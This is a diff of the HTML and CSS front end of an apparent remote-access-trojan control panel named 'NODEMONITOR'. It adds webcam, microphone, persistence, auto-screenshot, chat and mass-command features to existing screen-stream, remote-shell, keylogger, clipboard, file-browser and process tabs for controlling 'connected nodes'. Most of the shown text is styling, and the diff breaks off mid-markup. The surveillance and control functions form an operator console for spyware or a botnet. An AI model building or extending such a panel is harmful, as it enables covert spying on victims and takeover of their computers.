@@ -7,243 +7,251 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg:#080c10; --panel:#0d1117; --panel2:#111820; --border:#1a2332;
-  --accent:#00ff88; --accent2:#00b4ff; --warn:#ff6b35; --danger:#ff3366;
-  --text:#c9d1d9; --dim:#4a5568; --glow:0 0 20px rgba(0,255,136,0.3);
-}
+:root{--bg:#080c10;--panel:#0d1117;--panel2:#111820;--border:#1a2332;--accent:#00ff88;--accent2:#00b4ff;--warn:#ff6b35;--danger:#ff3366;--purple:#b388ff;--text:#c9d1d9;--dim:#4a5568;--glow:0 0 20px rgba(0,255,136,0.3);}
 *{margin:0;padding:0;box-sizing:border-box;}
 html,body{height:100%;overflow:hidden;}
 body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;display:flex;flex-direction:column;}
 body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:0;}
-
-/* ── Header ── */
-.header{flex-shrink:0;padding:16px 32px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(0,255,136,0.05),transparent);z-index:10;}
-.logo{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:24px;letter-spacing:8px;color:var(--accent);text-shadow:var(--glow);}
+/* Header */
+.header{flex-shrink:0;padding:14px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(0,255,136,0.05),transparent);z-index:10;}
+.logo{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:22px;letter-spacing:8px;color:var(--accent);text-shadow:var(--glow);}
 .logo span{color:var(--accent2);}
-.status-bar{display:flex;align-items:center;gap:16px;font-size:12px;color:var(--dim);}
+.status-bar{display:flex;align-items:center;gap:14px;font-size:12px;color:var(--dim);}
 .live-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite;}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
 .clock{color:var(--accent2);font-size:13px;}
-
-/* ── Layout ── */
+/* Layout */
 .app-body{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;}
-.sidebar{width:260px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
-.sidebar-title{padding:12px 16px;font-size:10px;letter-spacing:3px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;}
+.sidebar{width:240px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
+.sidebar-top{flex-shrink:0;padding:10px 14px;font-size:9px;letter-spacing:3px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;display:flex;justify-content:space-between;align-items:center;}
 .node-list{flex:1;overflow-y:auto;}
-.node-list::-webkit-scrollbar{width:4px;}
+.node-list::-webkit-scrollbar{width:3px;}
 .node-list::-webkit-scrollbar-thumb{background:var(--border);}
-.node-item{padding:12px 16px;border-bottom:1px solid rgba(26,35,50,0.5);cursor:pointer;transition:background .15s;position:relative;}
+.node-item{padding:10px 14px;border-bottom:1px solid rgba(26,35,50,0.5);cursor:pointer;transition:background .15s;position:relative;}
 .node-item:hover{background:rgba(0,255,136,0.04);}
 .node-item.selected{background:rgba(0,255,136,0.07);border-left:2px solid var(--accent);}
-.node-item .nh{color:var(--accent2);font-size:13px;font-weight:bold;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-.node-item .nu{color:var(--dim);font-size:11px;}
-.node-item .nb{position:absolute;top:12px;right:12px;}
-.node-dot{width:7px;height:7px;border-radius:50%;display:inline-block;}
-.node-dot.online{background:var(--accent);box-shadow:0 0 6px var(--accent);animation:pulse 1.5s infinite;}
+.node-item .nh{color:var(--accent2);font-size:12px;font-weight:bold;margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.node-item .nu{color:var(--dim);font-size:10px;}
+.node-item .nb{position:absolute;top:10px;right:10px;}
+.node-dot{width:6px;height:6px;border-radius:50%;display:inline-block;}
+.node-dot.online{background:var(--accent);box-shadow:0 0 5px var(--accent);animation:pulse 1.5s infinite;}
 .node-dot.offline{background:var(--warn);}
-.empty-sidebar{padding:40px 16px;text-align:center;color:var(--dim);font-size:12px;line-height:2;}
-
-/* ── Main area ── */
+.empty-sidebar{padding:30px 14px;text-align:center;color:var(--dim);font-size:11px;line-height:2;}
+/* Main */
 .main-area{flex:1;display:flex;flex-direction:column;overflow:hidden;}
-.stats-row{flex-shrink:0;display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:16px 24px;border-bottom:1px solid var(--border);}
-.stat-card{background:var(--panel);border:1px solid var(--border);padding:14px 18px;position:relative;overflow:hidden;}
+.stats-row{flex-shrink:0;display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:12px 20px;border-bottom:1px solid var(--border);}
+.stat-card{background:var(--panel);border:1px solid var(--border);padding:12px 16px;position:relative;overflow:hidden;}
 .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);}
 .stat-card.blue::before{background:var(--accent2);}
 .stat-card.orange::before{background:var(--warn);}
-.stat-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:4px;}
-.stat-value{font-family:'Rajdhani',sans-serif;font-size:36px;font-weight:700;color:var(--accent);line-height:1;}
+.stat-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:3px;}
+.stat-value{font-family:'Rajdhani',sans-serif;font-size:32px;font-weight:700;color:var(--accent);line-height:1;}
 .stat-card.blue .stat-value{color:var(--accent2);}
 .stat-card.orange .stat-value{color:var(--warn);}
-.content-area{flex:1;overflow-y:auto;padding:16px 24px;}
-.content-area::-webkit-scrollbar{width:6px;}
-.content-area::-webkit-scrollbar-track{background:var(--bg);}
-.content-area::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
-
-/* ── Panel ── */
-.panel{background:var(--panel);border:1px solid var(--border);margin-bottom:16px;}
-.panel-header{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:10px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
+.content-area{flex:1;overflow-y:auto;padding:14px 20px;}
+.content-area::-webkit-scrollbar{width:5px;}
+.content-area::-webkit-scrollbar-thumb{background:var(--border);}
+/* Panel */
+.panel{background:var(--panel);border:1px solid var(--border);margin-bottom:14px;}
+.panel-header{padding:9px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
 .panel-header .accent{color:var(--accent);}
-
-/* ── Node table ── */
+/* Table */
 table{width:100%;border-collapse:collapse;font-size:12px;}
-th{text-align:left;padding:10px 16px;font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);}
-td{padding:12px 16px;border-bottom:1px solid rgba(26,35,50,0.4);vertical-align:middle;}
+th{text-align:left;padding:9px 14px;font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);}
+td{padding:10px 14px;border-bottom:1px solid rgba(26,35,50,0.4);vertical-align:middle;}
 tr:last-child td{border-bottom:none;}
-tr:hover td{background:rgba(0,255,136,0.025);}
-.status-badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:2px 8px;border-radius:2px;}
+tr:hover td{background:rgba(0,255,136,0.02);}
+.status-badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:2px 7px;border-radius:2px;}
 .status-badge.online{background:rgba(0,255,136,0.1);color:var(--accent);border:1px solid rgba(0,255,136,0.3);}
 .status-badge.offline{background:rgba(255,107,53,0.1);color:var(--warn);border:1px solid rgba(255,107,53,0.3);}
 .status-badge::before{content:'';width:4px;height:4px;border-radius:50%;background:currentColor;}
 .status-badge.online::before{animation:pulse 1.5s infinite;}
 .hostname{color:var(--accent2);font-weight:bold;}
 .platform-badge{font-size:10px;padding:2px 7px;background:rgba(0,180,255,0.08);border:1px solid rgba(0,180,255,0.2);color:var(--accent2);}
-
-/* ── Buttons ── */
+/* Buttons */
 .btn{font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px 12px;border:1px solid;cursor:pointer;background:transparent;letter-spacing:1px;transition:all .15s;border-radius:2px;}
 .btn:disabled{opacity:0.4;cursor:not-allowed;}
 .btn-green{color:var(--accent);border-color:rgba(0,255,136,0.4);}
-.btn-green:hover:not(:disabled){background:rgba(0,255,136,0.1);box-shadow:0 0 8px rgba(0,255,136,0.2);}
+.btn-green:hover:not(:disabled){background:rgba(0,255,136,0.1);}
 .btn-blue{color:var(--accent2);border-color:rgba(0,180,255,0.4);}
 .btn-blue:hover:not(:disabled){background:rgba(0,180,255,0.1);}
 .btn-red{color:var(--danger);border-color:rgba(255,51,102,0.4);}
 .btn-red:hover:not(:disabled){background:rgba(255,51,102,0.1);}
 .btn-warn{color:var(--warn);border-color:rgba(255,107,53,0.4);}
 .btn-warn:hover:not(:disabled){background:rgba(255,107,53,0.1);}
+.btn-purple{color:var(--purple);border-color:rgba(179,136,255,0.4);}
+.btn-purple:hover:not(:disabled){background:rgba(179,136,255,0.1);}
 .btn-sm{padding:3px 8px;font-size:10px;}
-
-/* ── Modal ── */
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:1000;align-items:center;justify-content:center;}
+/* Modal */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:1000;align-items:center;justify-content:center;}
 .modal-overlay.open{display:flex;}
-.modal{background:var(--panel);border:1px solid var(--border);width:90vw;max-width:900px;height:88vh;display:flex;flex-direction:column;position:relative;overflow:hidden;}
-.modal-header{flex-shrink:0;padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
-.modal-title{font-family:'Rajdhani',sans-serif;font-size:18px;font-weight:700;color:var(--accent);letter-spacing:4px;}
-.modal-close{background:none;border:none;color:var(--dim);font-size:20px;cursor:pointer;line-height:1;padding:4px;}
+.modal{background:var(--panel);border:1px solid var(--border);width:92vw;max-width:1000px;height:88vh;display:flex;flex-direction:column;overflow:hidden;}
+.modal-header{flex-shrink:0;padding:12px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.modal-title{font-family:'Rajdhani',sans-serif;font-size:17px;font-weight:700;color:var(--accent);letter-spacing:4px;}
+.modal-subtitle{font-size:11px;color:var(--dim);margin-left:12px;}
+.modal-close{background:none;border:none;color:var(--dim);font-size:18px;cursor:pointer;padding:4px;}
 .modal-close:hover{color:var(--warn);}
-.modal-tabs{flex-shrink:0;display:flex;border-bottom:1px solid var(--border);}
-.tab-btn{flex:1;padding:10px;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:2px;background:none;border:none;border-bottom:2px solid transparent;color:var(--dim);cursor:pointer;text-transform:uppercase;transition:all .15s;}
+.modal-tabs{flex-shrink:0;display:flex;border-bottom:1px solid var(--border);overflow-x:auto;}
+.modal-tabs::-webkit-scrollbar{height:0;}
+.tab-btn{flex-shrink:0;padding:9px 14px;font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:2px;background:none;border:none;border-bottom:2px solid transparent;color:var(--dim);cursor:pointer;text-transform:uppercase;white-space:nowrap;}
 .tab-btn:hover{color:var(--text);}
 .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent);}
 .modal-body{flex:1;min-height:0;display:flex;flex-direction:column;}
 .tab-content{display:none;flex:1;min-height:0;flex-direction:column;}
 .tab-content.active{display:flex;}
-.tab-scroll{flex:1;overflow-y:auto;padding:16px 20px;}
-.tab-scroll::-webkit-scrollbar{width:5px;}
-.tab-scroll::-webkit-scrollbar-thumb{background:var(--border);}
-
-/* ── Screen stream ── */
-.stream-wrapper{flex:1;overflow:auto;display:flex;align-items:flex-start;justify-content:center;padding:12px;background:#000;position:relative;}
-.stream-wrapper::-webkit-scrollbar{width:6px;height:6px;}
+/* Stream */
+.stream-wrapper{flex:1;min-height:0;overflow:auto;display:flex;align-items:flex-start;justify-content:center;padding:10px;background:#000;}
+.stream-wrapper::-webkit-scrollbar{width:5px;height:5px;}
 .stream-wrapper::-webkit-scrollbar-thumb{background:var(--border);}
-#screen-img{max-width:100%;display:block;cursor:crosshair;image-rendering:auto;}
-.stream-toolbar{flex-shrink:0;padding:10px 16px;border-top:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
-.stream-status{font-size:11px;color:var(--dim);margin-left:auto;}
-
-/* ── Keylog ── */
-.keylog-output{flex:1;overflow-y:auto;padding:12px 16px;font-size:12px;line-height:1.9;background:#050810;border:1px solid var(--border);margin:16px 20px;white-space:pre-wrap;word-break:break-all;}
-.keylog-output::-webkit-scrollbar{width:5px;}
+#screen-img{max-width:100%;display:block;cursor:crosshair;}
+#webcam-img{max-width:100%;display:block;}
+.stream-toolbar{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
+.stream-status{font-size:10px;color:var(--dim);margin-left:auto;}
+/* Keylog */
+.keylog-output{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;font-size:13px;line-height:2;background:#050810;border:none;white-space:pre-wrap;word-break:break-all;}
+.keylog-output::-webkit-scrollbar{width:4px;}
 .keylog-output::-webkit-scrollbar-thumb{background:var(--border);}
-.keylog-chunk{color:var(--text);}
-.keylog-chunk .kl-time{color:var(--dim);font-size:11px;}
-.keylog-chunk .kl-special{color:var(--warn);}
-.keylog-controls{flex-shrink:0;padding:10px 20px;border-top:1px solid var(--border);display:flex;gap:10px;align-items:center;}
-
-/* ── Shell ── */
-.shell-output{flex:1;overflow-y:auto;padding:12px 16px;font-size:12px;line-height:1.8;background:#050810;border:1px solid var(--border);margin:16px 20px 0;white-space:pre-wrap;word-break:break-all;}
-.shell-output::-webkit-scrollbar{width:5px;}
+.kl-special{color:var(--warn);}
+.keylog-controls{flex-shrink:0;padding:8px 16px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;}
+/* Shell */
+.shell-output{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;font-size:12px;line-height:1.8;background:#050810;white-space:pre-wrap;word-break:break-all;}
+.shell-output::-webkit-scrollbar{width:4px;}
 .shell-output::-webkit-scrollbar-thumb{background:var(--border);}
 .shell-stdout{color:var(--text);}
 .shell-stderr{color:var(--warn);}
-.shell-prompt{color:var(--accent);font-weight:bold;}
-.shell-input-row{flex-shrink:0;padding:10px 20px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;}
+.shell-prompt-line{color:var(--accent);}
+.shell-input-row{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;}
 .shell-input-row span{color:var(--accent);font-size:13px;}
 .shell-input{flex:1;background:transparent;border:none;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;}
-
-/* ── Clipboard ── */
-.clip-area{flex:1;overflow-y:auto;padding:16px 20px;}
-.clip-area::-webkit-scrollbar{width:5px;}
+/* Clipboard */
+.clip-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
+.clip-area::-webkit-scrollbar{width:4px;}
 .clip-area::-webkit-scrollbar-thumb{background:var(--border);}
-.clip-display{background:#050810;border:1px solid var(--border);padding:12px 14px;font-size:12px;color:var(--text);min-height:80px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:12px;}
-.clip-display::-webkit-scrollbar{width:5px;}
-.clip-display::-webkit-scrollbar-thumb{background:var(--border);}
-.clip-input{width:100%;background:#050810;border:1px solid var(--border);padding:10px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;resize:vertical;min-height:70px;outline:none;margin-bottom:10px;}
+.clip-display{background:#050810;border:1px solid var(--border);padding:10px 12px;font-size:12px;color:var(--text);min-height:60px;max-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:10px;}
+.clip-input{width:100%;background:#050810;border:1px solid var(--border);padding:8px 12px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;resize:vertical;min-height:60px;outline:none;margin-bottom:8px;}
 .clip-input:focus{border-color:rgba(0,255,136,0.4);}
-
-/* ── File browser ── */
-.fb-nav{flex-shrink:0;padding:10px 20px;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center;}
-.fb-path{flex:1;background:#050810;border:1px solid var(--border);padding:6px 10px;color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;}
-.fb-path:focus{border-color:rgba(0,180,255,0.4);}
-.fb-list{flex:1;overflow-y:auto;padding:0 20px 16px;}
-.fb-list::-webkit-scrollbar{width:5px;}
+/* File browser */
+.fb-nav{flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:7px;align-items:center;}
+.fb-path{flex:1;background:#050810;border:1px solid var(--border);padding:5px 9px;color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:11px;outline:none;}
+.fb-colhdr{flex-shrink:0;display:flex;align-items:center;gap:8px;padding:6px 10px 6px 18px;font-size:9px;letter-spacing:2px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;}
+.fb-list{flex:1;min-height:0;overflow-y:auto;padding-bottom:10px;}
+.fb-list::-webkit-scrollbar{width:4px;}
 .fb-list::-webkit-scrollbar-thumb{background:var(--border);}
-.fb-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-bottom:1px solid rgba(26,35,50,0.4);cursor:pointer;font-size:12px;transition:background .1s;}
+.fb-item{display:flex;align-items:center;gap:8px;padding:7px 10px;border-bottom:1px solid rgba(26,35,50,0.35);cursor:pointer;font-size:11px;transition:background .1s;}
 .fb-item:hover{background:rgba(0,255,136,0.04);}
-.fb-item .fi-icon{width:16px;text-align:center;font-size:13px;}
+.fb-item .fi-icon{width:14px;text-align:center;font-size:12px;}
 .fb-item .fi-name{flex:1;color:var(--text);}
 .fb-item.is-dir .fi-name{color:var(--accent2);}
-.fb-item .fi-size{color:var(--dim);font-size:11px;min-width:70px;text-align:right;}
-.fb-item .fi-date{color:var(--dim);font-size:11px;min-width:115px;text-align:right;}
-.fb-item .fi-actions{display:flex;gap:5px;opacity:0;transition:opacity .1s;}
-.fb-item:hover .fi-actions{opacity:1;}
-.fb-header{display:flex;align-items:center;gap:10px;padding:7px 10px;font-size:9px;letter-spacing:2px;color:var(--dim);border-bottom:1px solid var(--border);text-transform:uppercase;}
-
-/* ── Sysinfo ── */
-.sysinfo-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
-.si-card{background:var(--panel2);border:1px solid var(--border);padding:14px 16px;}
-.si-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:6px;}
-.si-value{font-size:14px;color:var(--text);}
+.fb-item .fi-size{color:var(--dim);font-size:10px;min-width:65px;text-align:right;}
+.fb-item .fi-date{color:var(--dim);font-size:10px;min-width:110px;text-align:right;}
+.fb-item .fi-act{display:flex;gap:4px;opacity:0;min-width:80px;justify-content:flex-end;}
+.fb-item:hover .fi-act{opacity:1;}
+/* Sysinfo */
+.sysinfo-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.si-card{background:var(--panel2);border:1px solid var(--border);padding:12px 14px;}
+.si-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:5px;}
+.si-value{font-size:13px;color:var(--text);}
 .si-value.accent{color:var(--accent);}
 .si-value.accent2{color:var(--accent2);}
-.progress-bar{height:4px;background:var(--border);margin-top:6px;border-radius:2px;overflow:hidden;}
-.progress-fill{height:100%;border-radius:2px;transition:width .5s;background:var(--accent);}
+.progress-bar{height:3px;background:var(--border);margin-top:5px;border-radius:2px;overflow:hidden;}
+.progress-fill{height:100%;border-radius:2px;background:var(--accent);}
 .progress-fill.warn{background:var(--warn);}
 .progress-fill.danger{background:var(--danger);}
-
-/* ── Process list ── */
-.proc-table{width:100%;font-size:11px;}
-.proc-table th{padding:8px 10px;font-size:9px;letter-spacing:2px;color:var(--dim);}
-.proc-table td{padding:7px 10px;border-bottom:1px solid rgba(26,35,50,0.4);}
-.proc-table tr:hover td{background:rgba(0,255,136,0.025);}
-
-/* ── Log ── */
-.log-area{overflow-y:auto;padding:12px 16px;font-size:12px;max-height:160px;color:var(--dim);line-height:1.8;}
-.log-area::-webkit-scrollbar{width:4px;}
+/* Processes */
+.proc-table th{padding:7px 10px;}
+.proc-table td{padding:6px 10px;border-bottom:1px solid rgba(26,35,50,0.35);}
+/* Network */
+.net-section{margin-bottom:16px;}
+.net-title{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border);}
+.net-iface{display:flex;gap:16px;padding:6px 10px;border-bottom:1px solid rgba(26,35,50,0.3);font-size:11px;}
+.net-iface .ni-name{color:var(--accent2);min-width:120px;}
+.net-iface .ni-ip{color:var(--text);}
+.net-iface .ni-mask{color:var(--dim);}
+/* Mic */
+.mic-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
+.mic-area::-webkit-scrollbar{width:4px;}
+.mic-area::-webkit-scrollbar-thumb{background:var(--border);}
+.audio-item{background:var(--panel2);border:1px solid var(--border);padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:12px;}
+.audio-item audio{flex:1;height:28px;}
+/* Screenshot gallery */
+.ss-gallery{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;align-content:start;}
+.ss-gallery::-webkit-scrollbar{width:4px;}
+.ss-gallery::-webkit-scrollbar-thumb{background:var(--border);}
+.ss-thumb{background:var(--panel2);border:1px solid var(--border);overflow:hidden;cursor:pointer;}
+.ss-thumb img{width:100%;display:block;}
+.ss-thumb .ss-info{padding:5px 8px;font-size:10px;color:var(--dim);}
+/* Chat */
+.chat-messages{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;}
+.chat-messages::-webkit-scrollbar{width:4px;}
+.chat-messages::-webkit-scrollbar-thumb{background:var(--border);}
+.chat-msg{padding:8px 12px;margin-bottom:8px;border-left:3px solid var(--accent);background:rgba(0,255,136,0.04);font-size:12px;}
+.chat-msg .cm-time{font-size:10px;color:var(--dim);margin-bottom:3px;}
+.chat-msg .cm-text{color:var(--text);}
+.chat-input-row{flex-shrink:0;padding:10px 16px;border-top:1px solid var(--border);display:flex;gap:8px;}
+.chat-input{flex:1;background:#050810;border:1px solid var(--border);padding:7px 10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;}
+.chat-input:focus{border-color:rgba(0,255,136,0.4);}
+/* Mass cmd */
+.mass-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
+.mass-area::-webkit-scrollbar{width:4px;}
+.mass-area::-webkit-scrollbar-thumb{background:var(--border);}
+.mass-result{background:var(--panel2);border:1px solid var(--border);padding:8px 12px;margin-bottom:6px;font-size:11px;}
+.mass-result .mr-host{color:var(--accent2);margin-bottom:3px;}
+.mass-result .mr-out{color:var(--text);white-space:pre-wrap;word-break:break-all;}
+.mass-result .mr-err{color:var(--warn);}
+/* Persist */
+.persist-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
+/* Log */
+.log-area{overflow-y:auto;padding:10px 14px;font-size:11px;max-height:140px;color:var(--dim);line-height:1.8;}
+.log-area::-webkit-scrollbar{width:3px;}
 .log-area::-webkit-scrollbar-thumb{background:var(--border);}
 .log-line{display:flex;gap:10px;}
-.log-time{color:var(--dim);min-width:75px;}
+.log-time{color:var(--dim);min-width:70px;}
 .log-msg.connect{color:var(--accent);}
 .log-msg.disconnect{color:var(--warn);}
 .log-msg.info{color:var(--accent2);}
 .log-msg.error{color:var(--danger);}
-
-/* ── Misc ── */
-.scan-line{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:0.15;animation:scan 5s linear infinite;pointer-events:none;z-index:9999;}
+/* Misc */
+.scan-line{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:0.12;animation:scan 5s linear infinite;pointer-events:none;z-index:9999;}
 @keyframes scan{0%{top:-2px}100%{top:100vh}}
-.loading{color:var(--dim);font-size:12px;padding:12px 0;text-align:center;animation:pulse 1.5s infinite;}
+.loading{color:var(--dim);font-size:12px;padding:20px;text-align:center;animation:pulse 1.5s infinite;}
 .no-data{color:var(--dim);font-size:12px;padding:20px;text-align:center;}
-input[type=text],input[type=number]{background:#050810;border:1px solid var(--border);padding:5px 10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;border-radius:2px;}
+input[type=text],input[type=number]{background:#050810;border:1px solid var(--border);padding:4px 9px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:11px;outline:none;border-radius:2px;}
 input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4);}
+select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:11px;outline:none;}
+.tag{font-size:9px;padding:2px 7px;border-radius:2px;border:1px solid;}
+.tag-green{color:var(--accent);border-color:rgba(0,255,136,0.3);background:rgba(0,255,136,0.08);}
+.tag-red{color:var(--danger);border-color:rgba(255,51,102,0.3);background:rgba(255,51,102,0.08);}
+.tag-blue{color:var(--accent2);border-color:rgba(0,180,255,0.3);background:rgba(0,180,255,0.08);}
 </style>
 </head>
 <body>
 <div class="scan-line"></div>
-
-<!-- Header -->
 <div class="header">
   <div class="logo">NODE<span>MONITOR</span></div>
   <div class="status-bar">
     <div class="live-dot"></div><span>LIVE</span>
     <span style="color:var(--border)">|</span>
     <span class="clock" id="clock">--:--:--</span>
+    <span style="color:var(--border)">|</span>
+    <button class="btn btn-warn btn-sm" onclick="openMassCmd()">⚡ MASS CMD</button>
   </div>
 </div>
-
-<!-- Body -->
 <div class="app-body">
-  <!-- Sidebar: node list -->
   <div class="sidebar">
-    <div class="sidebar-title">Connected Nodes</div>
-    <div class="node-list" id="node-list">
-      <div class="empty-sidebar">No nodes connected<br>Awaiting signal...</div>
-    </div>
+    <div class="sidebar-top"><span>NODES</span><span id="sb-count" style="color:var(--accent)">0</span></div>
+    <div class="node-list" id="node-list"><div class="empty-sidebar">No nodes<br>Awaiting signal...</div></div>
   </div>
-
-  <!-- Main -->
   <div class="main-area">
     <div class="stats-row">
-      <div class="stat-card"><div class="stat-label">Total Nodes</div><div class="stat-value" id="stat-total">0</div></div>
+      <div class="stat-card"><div class="stat-label">Total</div><div class="stat-value" id="stat-total">0</div></div>
       <div class="stat-card blue"><div class="stat-label">Online</div><div class="stat-value" id="stat-online">0</div></div>
       <div class="stat-card orange"><div class="stat-label">Offline</div><div class="stat-value" id="stat-offline">0</div></div>
     </div>
     <div class="content-area">
-      <!-- Node table -->
       <div class="panel">
-        <div class="panel-header"><span>CONNECTED <span class="accent">NODES</span></span><span id="last-update" style="color:var(--dim);font-size:10px;">WAITING...</span></div>
-        <div id="table-container">
-          <div class="no-data">⬡ NO NODES — AWAITING SIGNAL</div>
-        </div>
+        <div class="panel-header"><span>CONNECTED <span class="accent">NODES</span></span><span id="last-update" style="font-size:10px;">WAITING...</span></div>
+        <div id="table-container"><div class="no-data">⬡ AWAITING SIGNAL</div></div>
       </div>
-      <!-- Activity log -->
       <div class="panel">
         <div class="panel-header"><span>ACTIVITY <span class="accent">LOG</span></span></div>
         <div class="log-area" id="log"></div>
@@ -252,48 +260,70 @@ input[type=text]:focus,input[type=number]:focus{border-color:rgba(0,255,136,0.4)
   </div>
 </div>
 
-<!-- ══════════════ MODAL ══════════════ -->
+<!-- ══ NODE MODAL ══ -->
 <div class="modal-overlay" id="modal-overlay">
   <div class="modal">
     <div class="modal-header">
-      <span class="modal-title" id="modal-title">NODE CONTROL</span>
+      <div style="display:flex;align-items:baseline;gap:10px;">
+        <span class="modal-title" id="modal-title">NODE</span>
+        <span class="modal-subtitle" id="modal-subtitle"></span>
+      </div>
       <button class="modal-close" onclick="closeModal()">✕</button>
     </div>
     <div class="modal-tabs">
       <button class="tab-btn active" data-tab="screen">SCREEN</button>
+      <button class="tab-btn" data-tab="webcam">WEBCAM</button>
       <button class="tab-btn" data-tab="shell">SHELL</button>
       <button class="tab-btn" data-tab="keylog">KEYLOG</button>
+      <button class="tab-btn" data-tab="mic">MIC</button>
       <button class="tab-btn" data-tab="clipboard">CLIPBOARD</button>
       <button class="tab-btn" data-tab="files">FILES</button>
+      <button class="tab-btn" data-tab="network">NETWORK</button>
       <button class="tab-btn" data-tab="sysinfo">SYSINFO</button>
       <button class="tab-btn" data-tab="processes">PROCESSES</button>
+      <button class="tab-btn" data-tab="autoshots">AUTO-SS</button>
+      <button class="tab-btn" data-tab="chat">CHAT</button>
+      <button class="tab-btn" data-tab="persist">PERSIST</button>
     </div>
     <div class="modal-body">
 
-      <!-- SCREEN TAB -->
+      <!-- SCREEN -->
       <div class="tab-content active" id="tab-screen">
         <div class="stream-wrapper" id="stream-wrapper">
           <img id="screen-img" src="" alt="" style="display:none;">
-          <div id="stream-placeholder" style="color:var(--dim);font-size:12px;padding:40px;text-align:center;">Stream stopped — click START to begin</div>
